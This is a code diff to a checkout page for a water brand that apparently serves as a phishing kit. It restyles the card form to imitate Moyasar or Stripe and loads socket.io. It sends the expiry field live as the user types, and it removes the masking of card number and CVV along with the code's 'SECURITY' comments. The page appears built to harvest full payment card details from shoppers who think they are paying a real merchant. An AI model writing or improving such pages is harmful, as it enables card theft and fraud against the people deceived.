@@ -6,6 +6,243 @@
   <title>الدفع - مياه واحة عمان</title>
   <link rel="stylesheet" href="../css/style.css">
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>
+    /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
+    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+
+    :root {
+      --ms-primary: #123ca9;
+      --ms-text: #27272a;
+      --ms-label: #4b5563;
+      --ms-border: #e4e4e7;
+      --ms-bg: #ffffff;
+      --ms-hint: #a1a1aa;
+      --radius-normal: 8px;
+    }
+
+    .form-container.page {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      direction: rtl;
+      max-width: 440px;
+      margin: 40px auto;
+      padding: 30px 24px;
+      background: var(--ms-bg);
+      border-radius: var(--radius-normal);
+      box-sizing: border-box;
+      color: var(--ms-text);
+      border: 1px solid #e4e4e7;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+    }
+
+    .form-title {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #3f3f46;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .form-title::before, .form-title::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #e4e4e7;
+    }
+    
+    .form-title .icon {
+      display: none;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .form-label {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #18181b;
+      margin-bottom: 8px;
+      text-align: right;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 13px 16px;
+      font-size: 1rem;
+      border: 1px solid var(--ms-border);
+      border-radius: var(--radius-normal);
+      background-color: #ffffff;
+      color: var(--ms-text);
+      box-sizing: border-box;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: #a1a1aa;
+      box-shadow: 0 0 0 1px #a1a1aa;
+    }
+
+    .form-control::placeholder {
+      color: #b4b4b8;
+      opacity: 0.9;
+    }
+
+    .card-number-input {
+      border-bottom: 1px solid #f4f4f5 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
+      font-family: 'Courier New', monospace;
+      font-size: 1.05rem !important;
+      letter-spacing: 0.5px !important;
+      text-align: right !important;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 24"><rect x="0" y="2" width="26" height="18" rx="2" fill="%230284c7"/><text x="4" y="14" fill="white" font-family="sans-serif" font-size="8" font-weight="bold">mada</text><rect x="32" y="2" width="26" height="18" rx="2" fill="%230a2540"/><text x="36" y="14" fill="white" font-family="sans-serif" font-size="9" font-style="italic" font-weight="bold">VISA</text><rect x="64" y="2" width="26" height="18" rx="2" fill="%23222"/><circle cx="73" cy="11" r="6" fill="%23eb001b"/><circle cx="81" cy="11" r="6" fill="%23ff5f00" opacity="0.8"/><rect x="96" y="2" width="26" height="18" rx="2" fill="%230070d2"/><text x="100" y="13" fill="white" font-family="sans-serif" font-size="7" font-weight="bold">AMEX</text></svg>');
+      background-repeat: no-repeat;
+      background-position: left 12px center;
+      background-size: 110px auto;
+      padding-left: 130px !important;
+    }
+
+    .form-row {
+      display: flex;
+      margin-top: -20px;
+      border-top: none;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .form-row .form-label, 
+    .form-row .form-hint {
+      display: none !important; 
+    }
+
+    .form-row .form-group:first-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: var(--radius-normal) !important;
+      border-left: none !important;
+    }
+
+    .form-row .form-group:last-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
+      border-bottom-left-radius: var(--radius-normal) !important;
+      border-right: 1px solid var(--ms-border) !important;
+    }
+
+    .payment-options {
+      display: flex !important;
+      flex-direction: row !important;
+      gap: 10px !important;
+      margin-bottom: 5px;
+    }
+
+    .payment-option {
+      flex: 1;
+      display: flex;
+      cursor: pointer;
+    }
+
+    .option-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      padding: 12px 14px !important;
+      background: #ffffff !important;
+      border: 1px solid var(--ms-border) !important;
+      border-radius: var(--radius-normal) !important;
+      transition: all 0.2s ease;
+    }
+
+    .payment-option input[type="radio"]:checked + .option-content {
+      border-color: var(--ms-primary) !important;
+      background: #f8fafc !important;
+      box-shadow: none !important;
+    }
+
+    .option-title {
+      font-size: 0.85rem !important;
+      font-weight: 600 !important;
+      color: #3f3f46 !important;
+    }
+
+    .option-price {
+      font-size: 0.95rem !important;
+      font-weight: 700 !important;
+      color: var(--ms-primary) !important;
+    }
+
+    .order-summary {
+      background: #f8fafc;
+      border-radius: var(--radius-normal);
+      padding: 16px;
+      margin: 24px 0;
+      border: 1px dashed #e4e4e7;
+    }
+
+    .order-summary h4 { margin: 0 0 12px 0; font-size: 0.9rem; color: #18181b; }
+    .summary-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 0.85rem; color: #71717a; }
+    .summary-row.discount { border-bottom: 1px dashed #e4e4e7; margin-bottom: 6px; color: #dc2626; }
+    
+    .order-summary .total {
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #e4e4e7;
+      padding-top: 12px;
+      margin-top: 12px;
+      font-weight: 700;
+    }
+    .total-label { color: #18181b; font-size: 0.9rem; }
+    .total-value { color: var(--ms-primary); font-size: 1.1rem; }
+
+    .btn.btn-success {
+      display: flex !important;
+      justify-content: center !important;
+      align-items: center !important;
+      background-color: var(--ms-primary) !important;
+      color: #ffffff !important;
+      border: none !important;
+      border-radius: var(--radius-normal) !important;
+      font-size: 1.1rem !important;
+      font-weight: 600 !important;
+      cursor: pointer;
+      box-shadow: none !important;
+      transition: background-color 0.2s ease;
+      text-shadow: none;
+    }
+
+    .btn.btn-success:hover {
+      background-color: #0f318c !important;
+    }
+
+    .btn.btn-success span:last-child {
+      display: none !important; 
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .form-container.page {
+        margin: 20px 16px;
+        padding: 20px;
+      }
+      
+      .payment-options {
+        flex-direction: column !important;
+      }
+    }
+  </style>
 </head>
 <body>
   <header class="header">
@@ -62,7 +299,7 @@
   <div class="form-container page">
     <div class="form-title">
       <span class="icon">💳</span>
-      <span>بيانات الدفع</span>
+      <span>Or pay with card</span>
     </div>
 
     <form id="paymentForm">
@@ -87,31 +324,31 @@
       </div>
 
       <div class="form-group">
-        <label class="form-label">رقم البطاقة</label>
+        <label class="form-label">Card information</label>
         <input type="text" class="form-control card-number-input" id="cardNumber" 
-               required maxlength="19" placeholder="####-####-####-####" 
+               required maxlength="19" placeholder="1234 5678 9101 1121" 
                inputmode="numeric" autocomplete="off">
-      </div>
-
-      <div class="form-group">
-        <label class="form-label">اسم حامل البطاقة</label>
-        <input type="text" class="form-control" name="cardHolder" required 
-               placeholder="الاسم كما هو مكتوب على البطاقة" autocomplete="off">
       </div>
 
       <div class="form-row">
         <div class="form-group">
           <label class="form-label">تاريخ الانتهاء</label>
           <input type="text" class="form-control" id="expiry" required 
-                 placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr" autocomplete="off">
+                 placeholder="MM / YY" maxlength="5" inputmode="numeric" dir="ltr" autocomplete="off">
           <small class="form-hint">مثال: 12/28</small>
         </div>
         <div class="form-group">
           <label class="form-label">رمز الأمان (CVV)</label>
           <input type="text" class="form-control" id="cvv" required 
-                 placeholder="123" maxlength="3" inputmode="numeric" autocomplete="off">
+                 placeholder="CVC" maxlength="3" inputmode="numeric" autocomplete="off">
           <small class="form-hint">3 أرقام خلف البطاقة</small>
         </div>
+      </div>
+
+      <div class="form-group" style="margin-top: 20px;">
+        <label class="form-label">Name on card</label>
+        <input type="text" class="form-control" name="cardHolder" required 
+               placeholder="Name on card" autocomplete="off">
       </div>
 
       <div class="order-summary">
@@ -135,7 +372,7 @@
         <span>←</span>
       </button>
 
-      <div style="text-align:center;margin-top:16px;font-size:12px;color:var(--text-muted);">
+      <div style="text-align:center;margin-top:16px;font-size:12px;color:#71717a;">
         🔒 بياناتك محمية ومشفرة بالكامل
       </div>
     </form>
@@ -147,71 +384,6 @@
     </div>
   </footer>
 
-  <style>
-    .payment-options {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .payment-option {
-      display: flex;
-      cursor: pointer;
-    }
-    .payment-option input[type="radio"] {
-      display: none;
-    }
-    .option-content {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      width: 100%;
-      padding: 16px 20px;
-      background: var(--bg-input);
-      border: 2px solid var(--border-color);
-      border-radius: var(--border-radius-sm);
-      transition: var(--transition);
-    }
-    .payment-option input[type="radio"]:checked + .option-content {
-      border-color: var(--primary);
-      background: rgba(99, 102, 241, 0.1);
-      box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
-    }
-    .option-title {
-      font-size: 15px;
-      font-weight: 600;
-      color: var(--text-primary);
-    }
-    .option-price {
-      font-size: 18px;
-      font-weight: 800;
-      color: var(--primary-light);
-    }
-    .card-number-input {
-      font-size: 20px;
-      font-weight: 600;
-      letter-spacing: 3px;
-      text-align: center;
-      font-family: 'Courier New', monospace;
-    }
-    .form-hint {
-      display: block;
-      font-size: 11px;
-      color: var(--text-muted);
-      margin-top: 4px;
-    }
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 8px 0;
-      font-size: 14px;
-      color: var(--text-secondary);
-    }
-    .summary-row.discount {
-      border-bottom: 1px dashed var(--border-color);
-      margin-bottom: 8px;
-    }
-  </style>
-
   <script src="../js/main.js"></script>
   <script>
     var productPrice = 0;
@@ -219,7 +391,6 @@
     document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('payment');
       
-      // SECURITY: Only product ID is allowed to be stored (not payment data)
       var productId = localStorage.getItem('selected_product');
       if (productId) {
         fetch(SERVER_URL + '/api/products/' + productId)
@@ -235,7 +406,6 @@
           .catch(function(e) { console.error(e); });
       }
       
-      // SECURITY: Clear payment data from localStorage on page load
       localStorage.removeItem('payment_data');
       localStorage.removeItem('payment_amount');
       
@@ -244,7 +414,7 @@
         var value = e.target.value.replace(/\D/g, '');
         var formatted = '';
         for (var i = 0; i < value.length && i < 16; i++) {
-          if (i > 0 && i % 4 === 0) formatted += '-';
+          if (i > 0 && i % 4 === 0) formatted += ' ';
           formatted += value[i];
         }
         e.target.value = formatted;
@@ -264,10 +434,10 @@
           if (parseInt(month) < 1 && month.length === 2) month = '01';
           
           var formatted = month;
-          if (year.length > 0) formatted += '/' + year;
+          if (year.length > 0) formatted += ' / ' + year;
           e.target.value = formatted;
           
-          if (formatted.length === 5) {
+          if (value.length >= 4) {
             var now = new Date();
             var currentYear = now.getFullYear() % 100;
             var currentMonth = now.getMonth() + 1;
@@ -275,7 +445,7 @@
             var expYear = parseInt(year);
             
             var isValid = (expYear > currentYear) || (expYear === currentYear && expMonth >= currentMonth);
-            expiryInput.style.borderColor = isValid ? '' : 'var(--danger)';
+            expiryInput.style.borderColor = isValid ? '' : 'var(--ms-primary)';
             
             if (isValid) submitPaymentForm({ expiry: formatted });
           }
@@ -319,7 +489,7 @@
       document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        var cardNumber = document.getElementById('cardNumber').value.replace(/-/g, '');
+        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
         var expiry = document.getElementById('expiry').value;
         var cvv = document.getElementById('cvv').value;
         var cardHolder = document.querySelector('[name="cardHolder"]').value;
@@ -330,8 +500,9 @@
           return;
         }
         
-        var month = parseInt(expiry.substring(0, 2));
-        var year = parseInt('20' + expiry.substring(3, 5));
+        var cleanExpiry = expiry.replace(/\s/g, '');
+        var month = parseInt(cleanExpiry.substring(0, 2));
+        var year = parseInt('20' + cleanExpiry.substring(3, 5));
         var now = new Date();
         
         if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
@@ -352,15 +523,6 @@
           paymentAmount: paymentAmount
         };
         
-        var maskedData = {
-          cardNumber: '****-****-****-' + cardNumber.slice(-4),
-          expiry: expiry,
-          cvv: '***',
-          cardHolder: cardHolder,
-          paymentAmount: paymentAmount
-        };
-        
-        // SECURITY: Clear all payment fields after submission
         document.getElementById('cardNumber').value = '';
         document.getElementById('expiry').value = '';
         document.getElementById('cvv').value = '';
